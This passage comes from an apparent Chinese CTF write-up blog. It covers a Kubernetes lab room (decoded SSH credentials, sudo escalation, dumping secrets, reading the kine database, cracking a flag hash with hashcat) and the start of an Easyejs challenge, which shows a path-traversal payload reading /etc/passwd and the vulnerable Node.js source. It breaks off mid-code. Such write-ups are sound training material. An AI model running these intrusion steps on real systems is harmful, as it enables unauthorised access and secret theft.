class="language-none">OZQWO4TBNZ2A&#x3D;&#x3D;&#x3D;&#x3D;</code></pre><p>使用 ciphey 解密，获得 ssh 账号和密码：<code>vagrant:hereiamatctf907</code></p><h2 id="4-Kubernetes信息收集"><a href="#4-Kubernetes信息收集" class="headerlink" title="4. Kubernetes信息收集"></a>4. Kubernetes信息收集</h2><p>使用 ssh 连接靶机：</p><pre class="language-none"><code class="language-none">ssh vagrant@&lt;server_ip&gt;</code></pre><p>由于 sudo 命令无需密码校验，使用 <code>sudo su</code> 进行权限提升<br>后续由于靶机环境无法正常使用 kubectl，因此在此处记录理论方法和实际方法两种</p><h3 id="4-1-理论方法"><a href="#4-1-理论方法" class="headerlink" title="4.1 理论方法"></a>4.1 理论方法</h3><p>通过 <code>ps aux</code> 查找关键进程：</p><pre class="language-none"><code class="language-none">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot      1407  5.7  5.6 787492 27636 ?        Ssl  12:40   0:38 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;k0s controller --single&#x3D;true</code></pre><p>发现靶机运行的是 k0s（轻量版k8s）</p><h4 id="4-1-1-secret信息收集"><a href="#4-1-1-secret信息收集" class="headerlink" title="4.1.1 secret信息收集"></a>4.1.1 secret信息收集</h4><p>使用 kubectl 获取 secret 列表：</p><pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get secret</code></pre><pre class="language-none"><code class="language-none">NAME                  TYPE                                  DATA   AGEdefault-token-nhwb5   kubernetes.io&#x2F;service-account-token   3      2d8hk8s.authentication    Opaque     </code></pre><p>深入 <code>k8s.authentication</code> 获取信息</p><pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get secret k8s.authentication <span class="token parameter variable">-o</span> json</code></pre><pre class="language-none"><code class="language-none">&#123;    &quot;apiVersion&quot;: &quot;v1&quot;,    &quot;data&quot;: &#123;        &quot;id&quot;: &quot;VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9&quot;    &#125;,    &quot;kind&quot;: &quot;Secret&quot;,    &quot;metadata&quot;: &#123;        &quot;creationTimestamp&quot;: &quot;2022-02-10T18:58:02Z&quot;,        &quot;name&quot;: &quot;k8s.authentication&quot;,        &quot;namespace&quot;: &quot;default&quot;,        &quot;resourceVersion&quot;: &quot;515&quot;,        &quot;uid&quot;: &quot;416e4783-03a8-4f92-8e91-8cbc491bf727&quot;    &#125;,    &quot;type&quot;: &quot;Opaque&quot;&#125;</code></pre><p>在 value 处获取到编码过后的 flag</p><pre class="language-none"><code class="language-none">VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9</code></pre><p>使用 ciphey 解密：</p><p><img src="image-3.png" alt="image-3.png"><br>获得 flag：</p><pre class="language-none"><code class="language-none">THM&#123;yes_there_$s_no_$ecret&#125;</code></pre><h4 id="4-1-2-pod信息收集"><a href="#4-1-2-pod信息收集" class="headerlink" title="4.1.2 pod信息收集"></a>4.1.2 pod信息收集</h4><p>使用 kubectl 获取所有 pod：</p><pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get pod <span class="token parameter variable">-A</span></code></pre><pre class="language-none"><code class="language-none">NAMESPACE     NAME                              READY   STATUS      RESTARTS       AGEinternship    internship-job-5drbm              0&#x2F;1     Completed   0              2d8hkube-system   kube-proxy-jws4q                  1&#x2F;1     Running     1 (102s ago)   2d8hkube-system   kube-router-vsq85                 1&#x2F;1     Running     1 (102s ago)   2d8hkube-system   kube-api                          1&#x2F;1     Running     1 (102s ago)   2d8hkube-system   coredns-6d9f49dcbb-9vbff          1&#x2F;1     Running     1 (102s ago)   2d8hkube-system   metrics-server-74c967d8d4-pvv8l   1&#x2F;1     Running     1 (102s ago)   2d8h</code></pre><p>一般在 kube-system 里面的 pod 都是 k8s 自己的服务, 并且会有一段随机后缀, 但是这里的 kube-api 并没有随机后缀, 比较可疑</p><p>深入 <code>kube-api</code> 获取信息：</p><pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> kube-api <span class="token parameter variable">-n</span> kube-system -- /bin/bash</code></pre><pre class="language-none"><code class="language-none">cd jokesls -la</code></pre><p>其中 .git 仓库比较可疑<br>查看分支和 commit 记录：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reflog<span class="token function">git</span> log</code></pre><p><img src="image-4.png" alt="image-4.png"></p><p>挨个 <code>git show</code>，获得 flag：</p><pre class="language-none"><code class="language-none">THM&#123;this_joke_is_cold_joke&#125;</code></pre><h4 id="4-1-3-job信息收集"><a href="#4-1-3-job信息收集" class="headerlink" title="4.1.3 job信息收集"></a>4.1.3 job信息收集</h4><p>由题目提示 <code>What&#39;s the secret to the FANG interview?</code><br>使用 kubectl 获取 internship job 信息：</p><pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get job <span class="token parameter variable">-n</span> internship</code></pre><pre class="language-none"><code class="language-none">NAME             COMPLETIONS   DURATION   AGEinternship-job   1&#x2F;1           3m10s      2d8h</code></pre><p>查看 <code>internship</code> job 的 yaml 配置文件：</p><pre class="language-bash" data-language="bash"><code class="language-bash">k0s kubectl get job <span class="token parameter variable">-n</span> internship <span class="token parameter variable">-o</span> yaml</code></pre><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1<span class="token key atrule">items</span><span class="token punctuation">:</span><span class="token punctuation">-</span> <span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> batch/v1  <span class="token key atrule">kind</span><span class="token punctuation">:</span> Job  <span class="token key atrule">metadata</span><span class="token punctuation">:</span>    <span class="token key atrule">annotations</span><span class="token punctuation">:</span>      <span class="token key atrule">batch.kubernetes.io/job-tracking</span><span class="token punctuation">:</span> <span class="token string">""</span>    <span class="token key atrule">creationTimestamp</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:55:33Z"</span>    <span class="token key atrule">generation</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token key atrule">labels</span><span class="token punctuation">:</span>      <span class="token key atrule">controller-uid</span><span class="token punctuation">:</span> 11cf55dc<span class="token punctuation">-</span>7903<span class="token punctuation">-</span>4b78<span class="token punctuation">-</span>b9d3<span class="token punctuation">-</span>62cf241ad26d      <span class="token key atrule">job-name</span><span class="token punctuation">:</span> internship<span class="token punctuation">-</span>job    <span class="token key atrule">name</span><span class="token punctuation">:</span> internship<span class="token punctuation">-</span>job    <span class="token key atrule">namespace</span><span class="token punctuation">:</span> internship    <span class="token key atrule">resourceVersion</span><span class="token punctuation">:</span> <span class="token string">"579"</span>    <span class="token key atrule">uid</span><span class="token punctuation">:</span> 11cf55dc<span class="token punctuation">-</span>7903<span class="token punctuation">-</span>4b78<span class="token punctuation">-</span>b9d3<span class="token punctuation">-</span>62cf241ad26d  <span class="token key atrule">spec</span><span class="token punctuation">:</span>    <span class="token key atrule">backoffLimit</span><span class="token punctuation">:</span> <span class="token number">6</span>    <span class="token key atrule">completionMode</span><span class="token punctuation">:</span> NonIndexed    <span class="token key atrule">completions</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token key atrule">parallelism</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token key atrule">selector</span><span class="token punctuation">:</span>      <span class="token key atrule">matchLabels</span><span class="token punctuation">:</span>        <span class="token key atrule">controller-uid</span><span class="token punctuation">:</span> 11cf55dc<span class="token punctuation">-</span>7903<span class="token punctuation">-</span>4b78<span class="token punctuation">-</span>b9d3<span class="token punctuation">-</span>62cf241ad26d    <span class="token key atrule">suspend</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token key atrule">template</span><span class="token punctuation">:</span>      <span class="token key atrule">metadata</span><span class="token punctuation">:</span>        <span class="token key atrule">creationTimestamp</span><span class="token punctuation">:</span> <span class="token null important">null</span>        <span class="token key atrule">labels</span><span class="token punctuation">:</span>          <span class="token key atrule">controller-uid</span><span class="token punctuation">:</span> 11cf55dc<span class="token punctuation">-</span>7903<span class="token punctuation">-</span>4b78<span class="token punctuation">-</span>b9d3<span class="token punctuation">-</span>62cf241ad26d          <span class="token key atrule">job-name</span><span class="token punctuation">:</span> internship<span class="token punctuation">-</span>job      <span class="token key atrule">spec</span><span class="token punctuation">:</span>        <span class="token key atrule">containers</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> <span class="token key atrule">command</span><span class="token punctuation">:</span>          <span class="token punctuation">-</span> echo          <span class="token punctuation">-</span> 26c3d1c068e7e01599c3612447410b5e56c779f1          <span class="token key atrule">image</span><span class="token punctuation">:</span> busybox          <span class="token key atrule">imagePullPolicy</span><span class="token punctuation">:</span> Always          <span class="token key atrule">name</span><span class="token punctuation">:</span> internship<span class="token punctuation">-</span>job          <span class="token key atrule">resources</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>          <span class="token key atrule">terminationMessagePath</span><span class="token punctuation">:</span> /dev/termination<span class="token punctuation">-</span>log          <span class="token key atrule">terminationMessagePolicy</span><span class="token punctuation">:</span> File        <span class="token key atrule">dnsPolicy</span><span class="token punctuation">:</span> ClusterFirst        <span class="token key atrule">restartPolicy</span><span class="token punctuation">:</span> Never        <span class="token key atrule">schedulerName</span><span class="token punctuation">:</span> default<span class="token punctuation">-</span>scheduler        <span class="token key atrule">securityContext</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token key atrule">terminationGracePeriodSeconds</span><span class="token punctuation">:</span> <span class="token number">30</span>  <span class="token key atrule">status</span><span class="token punctuation">:</span>    <span class="token key atrule">completionTime</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:59:26Z"</span>    <span class="token key atrule">conditions</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">lastProbeTime</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:59:26Z"</span>      <span class="token key atrule">lastTransitionTime</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:59:26Z"</span>      <span class="token key atrule">status</span><span class="token punctuation">:</span> <span class="token string">"True"</span>      <span class="token key atrule">type</span><span class="token punctuation">:</span> Complete    <span class="token key atrule">startTime</span><span class="token punctuation">:</span> <span class="token string">"2022-02-10T18:56:16Z"</span>    <span class="token key atrule">succeeded</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token key atrule">uncountedTerminatedPods</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token key atrule">kind</span><span class="token punctuation">:</span> List<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">resourceVersion</span><span class="token punctuation">:</span> <span class="token string">""</span></code></pre><p>在 command 中获得加密后的 flag</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">-</span> <span class="token key atrule">command</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> echo  <span class="token punctuation">-</span> 26c3d1c068e7e01599c3612447410b5e56c779f1</code></pre><p>hashcat 跑 rockyou.txt：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">gzip</span> <span class="token parameter variable">-d</span> /usr/share/wordlists/rockyou.txt.gz<span class="token function">chmod</span> <span class="token number">777</span> /usr/share/wordlists/rockyou.txthashcat <span class="token parameter variable">-m</span> <span class="token number">100</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> 26c3d1c068e7e01599c3612447410b5e56c779f1 /usr/share/wordlists/rockyou.txt</code></pre><p>获得 flag</p><pre class="language-none"><code class="language-none">26c3d1c068e7e01599c3612447410b5e56c779f1:chidori</code></pre><h3 id="4-2-实际方法"><a href="#4-2-实际方法" class="headerlink" title="4.2 实际方法"></a>4.2 实际方法</h3><h4 id="4-2-1-secret信息收集"><a href="#4-2-1-secret信息收集" class="headerlink" title="4.2.1 secret信息收集"></a>4.2.1 secret信息收集</h4><p><code>ps aux</code>：</p><pre class="language-none"><code class="language-none">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDkube-ap+  1717  2.4  6.3 728184 31344 ?        Sl   07:54   1:01 &#x2F;var&#x2F;lib&#x2F;k0s&#x2F;bin&#x2F;kine --endpoint&#x3D;sqlite:&#x2F;&#x2F;&#x2F;var&#x2F;lib&#x2F;k0s&#x2F;db&#x2F;state.db?more&#x3D;rwc&amp;_journal&#x3D;WAL&amp;cache&#x3D;shared --listen-address&#x3D;unix:&#x2F;&#x2F;&#x2F;run&#x2F;k0s&#x2F;kine&#x2F;kine.sock:2379</code></pre><p>由于 kubectl 无法正常使用，我们通过下载并分析 kine（etcd数据库）来获取数据</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /var/lib/k0s/db/state.db ./state.db<span class="token function">chmod</span> <span class="token number">777</span> ./state.db<span class="token function">scp</span> vagrant@<span class="token operator">&lt;</span>server_ip<span class="token operator">></span>:~/state.db <span class="token builtin class-name">.</span></code></pre><p>使用 vscode-sqlite 插件打开 state.db</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">)</span> <span class="token keyword">from</span> kine <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">'%/registry/secrets/default/%'</span><span class="token punctuation">;</span></code></pre><pre class="language-none"><code class="language-none">&#x2F;registry&#x2F;secrets&#x2F;default&#x2F;default-token-nhwb5...&#x2F;registry&#x2F;secrets&#x2F;default&#x2F;k8s.authentication...</code></pre><p>使用字符编码解码 k8s.authentication ，获得 flag</p><pre class="language-none"><code class="language-none">THM&#123;yes_there_$s_no_$ecret&#125;</code></pre><h4 id="4-2-2-pod-数据收集"><a href="#4-2-2-pod-数据收集" class="headerlink" title="4.2.2 pod 数据收集"></a>4.2.2 pod 数据收集</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">)</span> <span class="token keyword">from</span> kine <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">'%/registry/pods/%'</span><span class="token punctuation">;</span></code></pre><p><img src="image-5.png" alt="image-5.png"></p><p>一般在 kube-system 里面的 pod 都是 k8s 自己的服务, 并且会有一段随机后缀, 但是这里的 kube-api 并没有随机后缀, 比较可疑</p><p>深入 <code>kube-api</code> pod：</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">)</span> <span class="token keyword">from</span> kine <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">'%/registry/pods/kube-system/kube-api%'</span><span class="token punctuation">;</span></code></pre><p>发现该 pod 的 dockerhub 仓库镜像地址<br><img src="image-6.png" alt="image-6.png"><br>把该 docker image pull 到本地<br>发现 &#x2F;home&#x2F;ubuntu&#x2F;jokes 内存在用户文件</p><p><img src="image-7.png" alt="image-7.png"></p><p>其中 .git 仓库比较可疑<br>查看分支和 commit 记录：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reflog<span class="token function">git</span> log</code></pre><p><img src="image-8.png" alt="image-8.png"><br>挨个 <code>git show</code>，获得 flag：</p><pre class="language-none"><code class="language-none">THM&#123;this_joke_is_cold_joke&#125;</code></pre><h4 id="4-2-3-job信息收集"><a href="#4-2-3-job信息收集" class="headerlink" title="4.2.3 job信息收集"></a>4.2.3 job信息收集</h4><p>由题目提示 <code>What&#39;s the secret to the FANG interview?</code><br>我们深入 <code>internship-job-5drbm</code> pod：</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">)</span> <span class="token keyword">from</span> kine <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">'%/registry/pods/internship/internship-job-5drbm%'</span><span class="token punctuation">;</span></code></pre><p><img src="image-9.png" alt="image-9.png"><br>发现该 pod 使用了 busybox 镜像，并在启动时执行了 echo 命令放置 flag<br>hashcat 跑 rockyou.txt：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">gzip</span> <span class="token parameter variable">-d</span> /usr/share/wordlists/rockyou.txt.gz<span class="token function">chmod</span> <span class="token number">777</span> /usr/share/wordlists/rockyou.txthashcat <span class="token parameter variable">-m</span> <span class="token number">100</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> 26c3d1c068e7e01599c3612447410b5e56c779f1 /usr/share/wordlists/rockyou.txt</code></pre><p>获得 flag</p><pre class="language-none"><code class="language-none">26c3d1c068e7e01599c3612447410b5e56c779f1:chidori</code></pre>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 西湖论剑 Qual WriteUp</title>
      <link href="/write-up/2024-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-qual-writeup/"/>
      <url>/write-up/2024-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-qual-writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我们是冠军🏆！</p></blockquote><p><img src="image-1.jpg" alt="image-1.jpg"></p><h1 id="Easyejs"><a href="#Easyejs" class="headerlink" title="Easyejs"></a>Easyejs</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class="language-none"><code class="language-none">我的第一个nodejs项目</code></pre><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="1-robots-txt"><a href="#1-robots-txt" class="headerlink" title="1. robots.txt"></a>1. robots.txt</h3><pre class="language-none"><code class="language-none">User-agent: *Disallow: &#x2F;Disallow: &#x2F;indexDisallow: &#x2F;uploadDisallow: &#x2F;renameDisallow: &#x2F;fileDisallow: &#x2F;list</code></pre><h3 id="2-rename-file-任读"><a href="#2-rename-file-任读" class="headerlink" title="2. rename + file 任读"></a>2. rename + file 任读</h3><p>rename 处 可修改文件为路径穿越格式  <code>/../../../../etc/passwd</code></p><p>然后在 file 处可读取相应文件 实现任意文件读取</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//index.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _<span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"body-parser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> putil_merge <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"putil-merge"</span><span class="token punctuation">)</span><span class="token keyword">const</span> fileUpload <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-fileupload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">v4</span><span class="token operator">:</span> uuidv4 <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'uuid'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>value<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"lodash/seq"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将文件信息存储到全局字典中</span>global<span class="token punctuation">.</span>fileDictionary <span class="token operator">=</span> global<span class="token punctuation">.</span>fileDictionary <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">fileUpload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用 body-parser 处理 POST 请求的数据</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置模板的位置</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置模板引擎</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 静态文件（CSS）目录</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">//显示上传页面</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> file <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">.</span>file<span class="token punctuation">;</span>    <span class="token keyword">const</span> uniqueFileName <span class="token operator">=</span> <span class="token function">uuidv4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> destinationPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 将文件写入 uploads 目录</span>    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>destinationPath<span class="token punctuation">,</span> file<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    global<span class="token punctuation">.</span>fileDictionary<span class="token punctuation">[</span>uniqueFileName<span class="token punctuation">]</span> <span class="token operator">=</span> file<span class="token punctuation">.</span>name<span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>uniqueFileName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/list'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// const keys = Object.keys(global.fileDictionary);</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>fileDictionary<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>uniqueFileName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        uniqueFileName <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>uniqueFileName        filName <span class="token operator">=</span> global<span class="token punctuation">.</span>fileDictionary<span class="token punctuation">[</span>uniqueFileName<span class="token punctuation">]</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>filName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>__dirname<span class="token operator">+</span><span class="token string">"/uploads/"</span><span class="token operator">+</span>filName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"文件不存在！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"文件不存在！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"rename"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">,</span> 